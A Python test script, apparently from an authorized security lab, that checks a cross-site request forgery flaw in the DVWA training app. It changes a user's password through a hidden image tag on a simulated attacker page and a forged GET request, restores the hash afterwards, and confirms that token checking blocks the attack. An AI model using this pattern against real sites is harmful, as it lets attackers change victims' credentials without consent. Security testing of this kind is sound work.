# -*- coding: utf-8 -*-
"""OPT4-LG-02: DVWA csrf GET password change, cross-site composition.

Simulated inside the authorized lab: the request carries the victim session
cookie plus an attacker Referer and no token -- equivalent to what a victim
browser would auto-send for an <img> on an attacker page. No public page is
hosted. gordonb hash restored via DB afterwards.
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from opt4lib import (  # noqa: E402
    BATCH_ID, BASE_DVWA, SOURCE_COMMIT_DVWA, Client, Run, db_query,
    dvwa_login, md5_hex,
)

ORIGINAL = "abc123"
NEW = "opt4csrf"

ATTACKER_PAGE = """<!DOCTYPE html>
<!-- opt4 lab-only simulated attacker page (never hosted publicly) -->
<html><body>
<h1>Clicker game</h1>
<img src="http://127.0.0.1:9080/vulnerabilities/csrf/?password_new=opt4csrf&password_conf=opt4csrf&Change=Change" width="1" height="1" alt="">
</body></html>
"""


def gordonb_hash() -> str:
    rows = db_query("SELECT password FROM dvwa.users WHERE user='gordonb'")
    return rows[0][0] if rows else ""


def main() -> int:
    run = Run("opt4-20261020-lg02", {
        "case_id": "OPT4-LG-02",
        "batch_id": BATCH_ID,
        "deployment_id": "dvwa-wsl-02",
        "source_commit": SOURCE_COMMIT_DVWA,
        "base": BASE_DVWA,
    })
    obs: dict = {"steps": {}}
    obs["original_hash_ok"] = gordonb_hash() == md5_hex(ORIGINAL)

    # --- victim session at low security
    victim = Client(BASE_DVWA)
    dvwa_login(victim, "gordonb", ORIGINAL)
    victim.set_cookie("security", "low")

    # --- cross-site request: attacker referer, no token, GET (SEQ-A05)
    csrf_get = victim.get(
        "/vulnerabilities/csrf/?password_new={}&password_conf={}&Change=Change".format(NEW, NEW),
        headers={"Referer": "http://attacker.invalid/opt4.html"},
    )
    obs["steps"]["cross_site_get"] = {
        "status": csrf_get.status,
        "password_changed_message": "Password Changed." in csrf_get.text,
        "hash_changed_to_attacker_value": gordonb_hash() == md5_hex(NEW),
    }

    db_query("UPDATE dvwa.users SET password = MD5('abc123') WHERE user = 'gordonb'")
    obs["steps"]["cross_site_get"]["restored"] = gordonb_hash() == md5_hex(ORIGINAL)

    # --- impossible counterexample: token required
    c_imp = Client(BASE_DVWA)
    dvwa_login(c_imp, "gordonb", ORIGINAL)
    c_imp.set_cookie("security", "impossible")
    imp_get = c_imp.get(
        "/vulnerabilities/csrf/?password_new={}&password_conf={}&Change=Change".format(NEW, NEW),
        headers={"Referer": "http://attacker.invalid/opt4.html"},
    )
    obs["steps"]["impossible_control"] = {
        "status": imp_get.status,
        "rejected_by_token_check": imp_get.status in (301, 302),
        "no_change": gordonb_hash() == md5_hex(ORIGINAL),
    }

    final = gordonb_hash() == md5_hex(ORIGINAL)
    run.write_restore({
        "gordonb_hash": gordonb_hash(),
        "expected": md5_hex(ORIGINAL),
        "restored": final,
    })
    verdict = (
        obs["original_hash_ok"]
        and obs["steps"]["cross_site_get"]["password_changed_message"]
        and obs["steps"]["cross_site_get"]["hash_changed_to_attacker_value"]
        and obs["steps"]["cross_site_get"]["restored"]
        and obs["steps"]["impossible_control"]["rejected_by_token_check"]
        and final
    )
    obs["verdict"] = "触发" if verdict else "未触发"
    run.dump_clients({"victim": victim, "impossible": c_imp})
    run.artifact("csrf.cross-site.response.html", csrf_get.text)
    run.artifact("attacker_page.simulated.html", ATTACKER_PAGE)
    record = run.finish(obs)
    print(f"verdict={obs['verdict']}")
    print(f"evidence={record['run_id']} artifacts={len(run.artifact_hashes())}")
    return 0 if verdict else 1


if __name__ == "__main__":
    raise SystemExit(main())
